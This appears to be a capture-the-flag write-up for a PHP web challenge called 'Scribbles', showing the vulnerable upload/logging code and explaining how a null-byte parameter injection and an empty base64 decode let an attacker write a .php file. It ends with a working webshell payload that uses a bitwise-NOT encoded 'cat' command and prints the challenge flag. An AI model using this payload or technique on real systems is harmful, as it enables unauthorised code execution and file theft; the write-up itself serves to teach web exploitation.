# Scribbles

## Problem

```php
<?php

require('config.php');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  highlight_file(__FILE__);
  exit;
}
if (empty($_GET['action'])) {

  $data = $_POST['data'];
  $name = uniqid();

  $payload = "data=$data&name=$name";
  $post = http_build_query([
    'signature' => hash_hmac('md5', $payload, FLAG),
    'payload' => $payload,
  ]);

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "http://127.0.0.1" . $_SERVER['REQUEST_URI'] . "?action=log");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

  echo curl_exec($ch);

} else {

  if (hash_hmac('md5', $_POST['payload'], FLAG) !== $_POST['signature']) {
    echo 'FAIL';
    exit;
  }

  parse_str($_POST['payload'], $payload);

  $target = 'files/' . time() . '.' . substr($payload['name'], -20);
  $contents = $payload['data'];
  $decoded = base64_decode($contents);
  $ext = 'raw';

  if (isset($payload['ext'])) {
    $ext = (
      ( $payload['ext'] == 'j' ) ? 'jpg' :
      ( $payload['ext'] == 'p' ) ? 'php' :
      ( $payload['ext'] == 'r' ) ? 'raw' : 'file'
    );
  }

  if ($decoded !== '') {
    $contents = $decoded;
    $target .= '.' . $ext;
  }

  if (strlen($contents) > 37) {
    echo 'FAIL';
    exit;
  }

  file_put_contents($target, $contents);

  echo 'OK';
}
```

If we request without action parameter, it will construct post payload and send request to self(with action parameter) by curl.

The `hash_hmac` key is `FLAG`, but we don't know the content.

So we can't directly forge the signature.

## Exploit

The vulnerability is on `$payload = "data=$data&name=$name";`

We can't control `$name` variable, but we can use `$data` to control `$name`

Like this: set `$data`: `xxx&name=new_name%00`

The NULL byte will truncate the original name.

Now we can control the file name.

We want to write a webshell and execute it.

But if `$decoded !== ''`, it will append extension to the filename.

So we need to find a way to set `$decoded` empty.

And we know that php's `base64_decode()` will output empty string if its input doesn't contain any valid character.
(valid character include `a-z`, `A-Z`, `0-9`, `+`, `/`, ...)

Our goal is writing a non valid character webshell and the length shold be less than 38.

There are some tips, we can use some arithmetic operation like `XOR`, `NOT`, `AND`, ... to construct the php code.

So if we set data to ``` <?=`something`;%26name%3Dz.php%00```, the `$decoded` will be empty and the name can be controled.

The content of the file will not be decoded, it is the original content: ``` <?=`something`; ```

We can run the php script now.

## Payload

``` data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00```

`~%9c%9e%8b` is `cat`

so the payload will cat everthing in `../`, then write to `_`.

## Flag

config.php:

```php
<?php

set_time_limit(10);
define('FLAG', 'DCTF{7b39c8fcaef42b2f72d1f7d6f0686802bd9282f289f125281fd92c67572dd390}');

// added afterwards, not part of the challenge and keeps crashing apache because of a scenario
$_SERVER['REQUEST_URI'] = '/';
```
